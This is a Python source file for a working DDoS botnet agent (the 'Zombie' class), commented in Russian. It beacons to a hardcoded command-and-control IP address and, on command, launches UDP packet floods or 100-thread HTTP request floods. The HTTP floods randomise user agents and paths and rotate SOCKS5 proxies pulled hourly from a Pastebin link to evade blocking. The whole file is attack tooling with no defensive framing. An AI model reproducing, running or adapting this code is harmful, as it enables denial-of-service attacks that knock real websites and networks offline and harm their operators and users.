import socket
import time
import threading
import logging
import requests
import random
import string
import os
from urllib.parse import urlparse

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('zombie.log')]
)

# Список User-Agent для рандомизации
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
]

# Загрузка прокси из файла (только для httpskill)
def load_proxies():
    try:
        response = requests.get('https://pastebin.com/raw/GMVdyJ2c', timeout=5)
        response.raise_for_status()
        proxies = [line.strip() for line in response.text.split('\n') if line.strip() and ':' in line]
        logging.info(f"Успешно загружено {len(proxies)} прокси с Pastebin")
        return proxies
    except Exception as e:
        logging.error(f"Ошибка загрузки прокси с Pastebin: {str(e)}")
        return []

proxies = load_proxies()

class Zombie:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.server_ip = "212.41.7.231"  # Заменить на реальный IP
        self.running = True
        self.current_attack = None
        self.attack_threads = []
        self.max_threads = 100  # 100 потоков для httpskill
        self.proxy_list = load_proxies()
        # Запуск фонового потока для обновления прокси
        threading.Thread(target=self.update_proxies, daemon=True).start() 
    
    def update_proxies(self):
        while self.running:
            try:
                self.proxy_list = load_proxies()
                time.sleep(3600)  # Обновление каждые 3600 секунд (1 час)
            except Exception as e:
                logging.error(f"Ошибка при обновлении прокси: {str(e)}")
                time.sleep(60)  # Пауза 1 минута перед повторной попыткой    
        
    def start(self):
        threading.Thread(target=self.heartbeat, daemon=True).start()
        threading.Thread(target=self.listen_commands, daemon=True).start()

    def heartbeat(self):
        while self.running:
            try:
                self.sock.sendto(b"ALIVE", (self.server_ip, 6216))
                time.sleep(5)
            except Exception as e:
                logging.error(f"Ошибка heartbeat: {str(e)}")

    def listen_commands(self):
        while self.running:
            try:
                data, _ = self.sock.recvfrom(1024)
                if data == b"STOP":
                    self.stop_attack()
                else:
                    self.process_command(data.decode())
            except Exception as e:
                logging.error(f"Ошибка команды: {str(e)}")

    def process_command(self, command):
        try:
            if command.startswith('UDP:'):
                _, ip, port = command.split(':')
                if not self.is_attacking():
                    self.current_attack = ('udp', ip, int(port))
                    self.attack_threads = [threading.Thread(target=self.attack)]
                    self.attack_threads[0].start()
            elif command.startswith('HTTP:'):
                url = command[5:]
                if not self.is_attacking():
                    self.current_attack = ('http', url)
                    self.attack_threads = [threading.Thread(target=self.attack) for _ in range(self.max_threads)]
                    for thread in self.attack_threads:
                        thread.start()
        except Exception as e:
            logging.error(f"Неверная команда: {str(e)}")

    def get_proxy_dict(self):
        if not self.proxy_list:
            return {}
        proxy = random.choice(self.proxy_list)
        return {'http': f'socks5://{proxy}', 'https': f'socks5://{proxy}'}

    def attack(self):
        try:
            attack_type, *target = self.current_attack
            end_time = time.time() + 300
            
            if attack_type == 'udp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b"\x00" * 2048
                ip, port = target
                logging.info(f"🔥 Атака UDP на {ip}:{port}")
                while time.time() < end_time and self.running:
                    sock.sendto(payload, (ip, port))
                sock.close()
            elif attack_type == 'http':
                url = target[0]
                random_paths = [f"/{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}" for _ in range(50)]  # Увеличено до 50 путей
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': random.choice(['*/*', 'text/html', 'application/json']),
                    'Connection': 'close',  # Отключение keep-alive
                    'Accept-Language': random.choice(['en-US,en;q=0.9', 'ru-RU,ru;q=0.9', 'fr-FR,fr;q=0.9']),
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Referer': random.choice(['https://google.com', 'https://bing.com', url])
                }
                post_data = {
                    'data': ''.join(random.choices(string.ascii_letters + string.digits, k=500))
                }
                request_count = 0  # Счетчик запросов
                logging.info(f"🔥 Атака HTTP на {url} (поток {threading.current_thread().name})")
                while time.time() < end_time and self.running:
                    try:
                        proxy_dict = self.get_proxy_dict()  # Ротация прокси для каждого запроса
                        method = random.choices(['GET', 'POST', 'HEAD', 'OPTIONS'], weights=[70, 20, 5, 5])[0]  # Увеличена вероятность GET
                        target_url = url + random.choice(random_paths) if random.random() < 0.8 else url  # Увеличена вероятность случайных путей
                        if method == 'GET':
                            requests.get(target_url, headers=headers, proxies=proxy_dict, timeout=0.1)
                        elif method == 'POST':
                            requests.post(target_url, headers=headers, data=post_data, proxies=proxy_dict, timeout=0.1)
                        elif method == 'HEAD':
                            requests.head(target_url, headers=headers, proxies=proxy_dict, timeout=0.1)
                        else:
                            requests.options(target_url, headers=headers, proxies=proxy_dict, timeout=0.1)
                        request_count += 1
                        if request_count % 100 == 0:  # Логирование каждые 100 запросов
                            logging.info(f"Отправлено {request_count} запросов в потоке {threading.current_thread().name}")
                    except:
                        proxy_dict = self.get_proxy_dict()  # Переключение прокси при ошибке
                logging.info(f"✅ Атака завершена (поток {threading.current_thread().name}, всего запросов: {request_count})")
            
        except Exception as e:
            logging.error(f"❗ Ошибка атаки: {str(e)}")
            
    def stop_attack(self):
        if self.is_attacking():
            self.running = False
            for thread in self.attack_threads:
                thread.join()
            self.attack_threads = []
            self.running = True
            logging.info("🛑 Атака остановлена по команде")

    def is_attacking(self):
        return any(thread.is_alive() for thread in self.attack_threads) 

if __name__ == '__main__':
    zombie = Zombie()
    zombie.start()
    try:
        while True: 
            time.sleep(1)
    except KeyboardInterrupt:
        zombie.running = False
